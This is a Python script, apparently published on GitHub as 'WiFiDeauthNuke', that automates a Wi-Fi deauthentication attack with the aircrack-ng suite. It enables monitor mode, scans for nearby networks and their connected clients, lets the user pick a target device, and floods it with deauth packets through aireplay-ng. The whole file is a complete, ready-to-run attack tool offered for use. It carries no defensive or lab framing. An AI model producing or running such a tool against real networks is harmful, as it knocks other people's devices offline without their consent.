#!/usr/bin/python3

import subprocess
import os
import time

# Define ANSI color codes for colorful output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"

def print_banner():
    """Print a colorful WiFiDeauthNuke banner."""
    banner_text = f"""
{RED}██╗    ██╗██╗███████╗██╗    ██╗██████╗ ███████╗ █████╗ ███████╗██╗   ██╗██╗  ██╗███████╗
██║    ██║██║██╔════╝██║    ██║██╔══██╗██╔════╝██╔══██╗██╔════╝██║   ██║██║  ██║██╔════╝
██║ █╗ ██║██║█████╗  ██║ █╗ ██║██║  ██║█████╗  ███████║███████╗██║   ██║███████║█████╗  
██║███╗██║██║██╔══╝  ██║███╗██║██║  ██║██╔══╝  ██╔══██║╚════██║██║   ██║██╔══██║██╔══╝  
╚███╔███╔╝██║███████╗╚███╔███╔╝██████╔╝███████╗██║  ██║███████║╚██████╔╝██║  ██║███████╗
 ╚══╝╚══╝ ╚═╝╚══════╝ ╚══╝╚══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
{RESET}
{CYAN}WiFiDeauthNuke v1.0 - Created by github.com/fatherofphysics
{RESET}
"""
    print(banner_text)

def clear_screen():
    """Clear the terminal screen."""
    os.system('clear')

def get_iface():
    """Detect the network interface (wlan0 or wlan0mon)."""
    result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if 'wlan0mon' in result.stdout:
        return 'wlan0mon'
    elif 'wlan0' in result.stdout:
        return 'wlan0'
    else:
        print(f"{RED}No wireless interface detected.{RESET}")
        exit()

def kill_conflicting_processes():
    """Run airmon-ng check kill to stop interfering processes."""
    print(f"{YELLOW}Killing conflicting processes...{RESET}")
    subprocess.run(['airmon-ng', 'check', 'kill'])

def start_monitor_mode(iface):
    """Enable monitor mode on the wireless interface."""
    print(f"{GREEN}Starting monitor mode on {iface}...{RESET}")
    subprocess.run(['airmon-ng', 'start', iface])

def stop_monitor_mode(iface):
    """Disable monitor mode on the wireless interface."""
    print(f"{GREEN}Stopping monitor mode on {iface}...{RESET}")
    subprocess.run(['airmon-ng', 'stop', iface])

def set_channel(iface, channel):
    """Set the wireless interface to a specific channel."""
    print(f"{CYAN}Setting channel {channel} for {iface}...{RESET}")
    subprocess.run(['iwconfig', iface, 'channel', str(channel)])
    time.sleep(1)

def scan_networks(iface):
    """Scan for available networks and save results to a file."""
    print(f"{BLUE}Scanning for nearby Wi-Fi networks...{RESET}")
    scan_process = subprocess.Popen(['airodump-ng', '-w', 'scan_results', '--output-format', 'csv', iface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(10)  # Wait for a few seconds to gather data
    scan_process.terminate()

def parse_scan_results():
    """Parse scanned networks from the CSV file."""
    networks = []
    with open("scan_results-01.csv", "r") as file:
        for line in file:
            if "Station MAC" in line:
                break
            fields = line.split(',')
            if len(fields) > 14 and fields[0].strip() != "BSSID":
                bssid = fields[0].strip()
                channel = fields[3].strip()
                essid = fields[13].strip()
                networks.append({"bssid": bssid, "channel": channel, "essid": essid})
    return networks

def select_network(networks):
    """Display available networks and let the user select one."""
    print(f"{CYAN}Available Networks:{RESET}")
    for idx, network in enumerate(networks):
        print(f"{idx + 1}. {WHITE}ESSID: {network['essid']}, BSSID: {network['bssid']}, Channel: {network['channel']}{RESET}")
    choice = int(input(f"{YELLOW}Select a network by number: {RESET}")) - 1
    return networks[choice]

def scan_clients(iface, bssid, channel):
    """Scan for clients connected to a specific network on a specific channel."""
    set_channel(iface, channel)
    print(f"{BLUE}Scanning for clients on BSSID {bssid} at channel {channel}...{RESET}")
    scan_process = subprocess.Popen(['airodump-ng', iface, '--bssid', bssid, '--channel', str(channel), '-w', 'client_results', '--output-format', 'csv'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(10)
    scan_process.terminate()

def parse_client_results():
    """Parse connected clients from the client results CSV file."""
    clients = []
    reading_clients = False
    with open("client_results-01.csv", "r") as file:
        for line in file:
            if reading_clients and len(line.split(',')) > 5:
                fields = line.split(',')
                client_mac = fields[0].strip()
                clients.append(client_mac)
            if "Station MAC" in line:
                reading_clients = True
    return clients

def select_client(clients):
    """Display available clients and let the user select one."""
    print(f"{CYAN}Connected Clients:{RESET}")
    for idx, client in enumerate(clients):
        print(f"{idx + 1}. {WHITE}Client MAC: {client}{RESET}")
    choice = int(input(f"{YELLOW}Select a client by number: {RESET}")) - 1
    return clients[choice]

def deauth_attack(iface, device_mac, router_mac, retries=5):
    """Run aireplay-ng to deauthenticate a device from the router."""
    print(f"{RED}Sending deauth packets to device {device_mac} on router {router_mac}{RESET}")
    for i in range(retries):
        result = subprocess.run(['aireplay-ng', '--deauth', '10', '-c', device_mac, '-a', router_mac, iface])
        if result.returncode == 0:
            print(f"{GREEN}Attempt {i+1}: Deauth packets sent successfully.{RESET}")
        else:
            print(f"{RED}Attempt {i+1}: Failed to send deauth packets.{RESET}")
        time.sleep(1)

def cleanup_files():
    """Clean up scan result files."""
    os.remove("scan_results-01.csv")
    os.remove("client_results-01.csv")
    print(f"{GREEN}Temporary files cleaned up.{RESET}")

if __name__ == '__main__':
    clear_screen()
    print_banner()
    iface = get_iface()
    print(f"{GREEN}Detected interface: {iface}{RESET}")
    kill_conflicting_processes()
    start_monitor_mode(iface)
    
    # Scan for networks and select one
    scan_networks(iface)
    networks = parse_scan_results()
    
    if not networks:
        print(f"{RED}No networks found.{RESET}")
        exit()
    
    selected_network = select_network(networks)
    bssid = selected_network['bssid']
    channel = selected_network['channel']
    
    # Start scanning for clients on the selected network
    scan_clients(iface, bssid, channel)
    clients = parse_client_results()
    
    if not clients:
        print(f"{RED}No clients found on the selected network.{RESET}")
        stop_monitor_mode(iface)
        cleanup_files()
        exit()
    
    selected_client = select_client(clients)
    
    # Execute deauth attack with retries
    deauth_attack(iface, selected_client, bssid)
    
    # Clean up and restore the network interface
    cleanup_files()
    stop_monitor_mode(iface)
    print(f"{GREEN}Monitor mode disabled. Cleanup complete.{RESET}")
